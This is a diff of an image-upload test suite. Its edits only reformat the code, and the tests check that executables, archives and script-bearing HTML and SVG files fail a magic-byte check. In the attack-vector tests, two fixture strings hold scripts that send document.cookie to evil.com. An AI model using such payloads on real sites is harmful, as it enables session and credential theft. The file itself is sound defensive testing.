@@ -83,9 +83,7 @@ describe("processImage — happy path", () => {
 
 describe("processImage — failures", () => {
   it("throws InvalidImageError on an empty buffer", async () => {
-    await expect(processImage(Buffer.alloc(0))).rejects.toBeInstanceOf(
-      InvalidImageError,
-    );
+    await expect(processImage(Buffer.alloc(0))).rejects.toBeInstanceOf(InvalidImageError);
   });
 
   it("throws InvalidImageError on garbage bytes", async () => {
@@ -96,9 +94,7 @@ describe("processImage — failures", () => {
   it("throws ImageTooLargeError on a payload bigger than MAX_UPLOAD_BYTES", async () => {
     // We don't need a real image here — the size check runs first.
     const oversize = Buffer.alloc(MAX_UPLOAD_BYTES + 1);
-    await expect(processImage(oversize)).rejects.toBeInstanceOf(
-      ImageTooLargeError,
-    );
+    await expect(processImage(oversize)).rejects.toBeInstanceOf(ImageTooLargeError);
   });
 
   it("throws ImageTooLargeError on a decoded image past MAX_PIXELS", async () => {
@@ -116,9 +112,7 @@ describe("processImage — failures", () => {
       .png({ compressionLevel: 9 })
       .toBuffer();
     expect(tooManyPixels.length).toBeLessThan(MAX_UPLOAD_BYTES);
-    await expect(processImage(tooManyPixels)).rejects.toBeInstanceOf(
-      ImageTooLargeError,
-    );
+    await expect(processImage(tooManyPixels)).rejects.toBeInstanceOf(ImageTooLargeError);
   });
 });
 
@@ -135,22 +129,26 @@ describe("hasValidImageSignature", () => {
   it("recognises PNG (89 50 4E 47 ...)", async () => {
     const png = await sharp({
       create: { width: 100, height: 100, channels: 3, background: { r: 0, g: 0, b: 0 } },
-    }).png().toBuffer();
+    })
+      .png()
+      .toBuffer();
     expect(hasValidImageSignature(png)).toBe(true);
   });
 
   it("recognises WebP (RIFF....WEBP)", async () => {
     const webp = await sharp({
       create: { width: 100, height: 100, channels: 3, background: { r: 0, g: 0, b: 0 } },
-    }).webp().toBuffer();
+    })
+      .webp()
+      .toBuffer();
     expect(hasValidImageSignature(webp)).toBe(true);
   });
 
   it("rejects an EXE (PE header MZ)", () => {
     // Minimal PE signature: MZ at byte 0-1
     const exe = Buffer.alloc(64);
-    exe[0] = 0x4D; // M
-    exe[1] = 0x5A; // Z
+    exe[0] = 0x4d; // M
+    exe[1] = 0x5a; // Z
     expect(hasValidImageSignature(exe)).toBe(false);
   });
 
@@ -167,14 +165,12 @@ describe("hasValidImageSignature", () => {
   });
 
   it("rejects HTML", () => {
-    const html = Buffer.from(
-      "<!DOCTYPE html><html><body><script>alert(1)</script></body></html>",
-    );
+    const html = Buffer.from("<!DOCTYPE html><html><body><script>alert(1)</script></body></html>");
     expect(hasValidImageSignature(html)).toBe(false);
   });
 
   it("rejects a buffer too short for any signature", () => {
-    expect(hasValidImageSignature(Buffer.from([0xFF, 0xD8]))).toBe(false);
+    expect(hasValidImageSignature(Buffer.from([0xff, 0xd8]))).toBe(false);
     expect(hasValidImageSignature(Buffer.alloc(11))).toBe(false);
   });
 
@@ -186,9 +182,9 @@ describe("hasValidImageSignature", () => {
   it("rejects an ELF binary (Linux executable)", () => {
     // ELF magic: 7F 45 4C 46
     const elf = Buffer.alloc(64);
-    elf[0] = 0x7F;
+    elf[0] = 0x7f;
     elf[1] = 0x45; // E
-    elf[2] = 0x4C; // L
+    elf[2] = 0x4c; // L
     elf[3] = 0x46; // F
     expect(hasValidImageSignature(elf)).toBe(false);
   });
@@ -197,7 +193,7 @@ describe("hasValidImageSignature", () => {
     // ZIP magic: PK (50 4B 03 04)
     const zip = Buffer.alloc(64);
     zip[0] = 0x50; // P
-    zip[1] = 0x4B; // K
+    zip[1] = 0x4b; // K
     zip[2] = 0x03;
     zip[3] = 0x04;
     expect(hasValidImageSignature(zip)).toBe(false);
@@ -212,7 +208,9 @@ describe("processImage — PNG and WebP inputs", () => {
   it("accepts and converts a valid PNG to JPEG", async () => {
     const png = await sharp({
       create: { width: 640, height: 480, channels: 3, background: { r: 50, g: 100, b: 200 } },
-    }).png().toBuffer();
+    })
+      .png()
+      .toBuffer();
     const out = await processImage(png);
     expect(out.width).toBe(640);
     expect(out.height).toBe(480);
@@ -223,7 +221,9 @@ describe("processImage — PNG and WebP inputs", () => {
   it("accepts and converts a valid WebP to JPEG", async () => {
     const webp = await sharp({
       create: { width: 640, height: 480, channels: 3, background: { r: 50, g: 100, b: 200 } },
-    }).webp().toBuffer();
+    })
+      .webp()
+      .toBuffer();
     const out = await processImage(webp);
     expect(out.width).toBe(640);
     expect(out.height).toBe(480);
@@ -241,8 +241,8 @@ describe("processImage — attack vectors (magic byte gate)", () => {
     // Simulates: `malware.exe` renamed to `malware.jpg` with forged
     // Content-Type. The PE header (MZ) must NOT pass.
     const exe = Buffer.alloc(256);
-    exe[0] = 0x4D; // M
-    exe[1] = 0x5A; // Z
+    exe[0] = 0x4d; // M
+    exe[1] = 0x5a; // Z
     await expect(processImage(exe)).rejects.toBeInstanceOf(InvalidImageError);
     await expect(processImage(exe)).rejects.toThrow(/hlavičku obrázku/);
   });
@@ -250,8 +250,8 @@ describe("processImage — attack vectors (magic byte gate)", () => {
   it("rejects an SVG with embedded JavaScript", async () => {
     const svg = Buffer.from(
       `<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg">` +
-      `<script type="text/javascript">document.location='https://evil.com/?c='+document.cookie</script>` +
-      `</svg>`,
+        `<script type="text/javascript">document.location='https://evil.com/?c='+document.cookie</script>` +
+        `</svg>`,
     );
     await expect(processImage(svg)).rejects.toBeInstanceOf(InvalidImageError);
   });
@@ -259,7 +259,7 @@ describe("processImage — attack vectors (magic byte gate)", () => {
   it("rejects an HTML file with a script tag", async () => {
     const html = Buffer.from(
       `<!DOCTYPE html><html><head><title>Phishing</title></head>` +
-      `<body><script>fetch('https://evil.com',{method:'POST',body:document.cookie})</script></body></html>`,
+        `<body><script>fetch('https://evil.com',{method:'POST',body:document.cookie})</script></body></html>`,
     );
     await expect(processImage(html)).rejects.toBeInstanceOf(InvalidImageError);
   });
@@ -276,4 +276,3 @@ describe("processImage — attack vectors (magic byte gate)", () => {
     await expect(processImage(sh)).rejects.toBeInstanceOf(InvalidImageError);
   });
 });
-
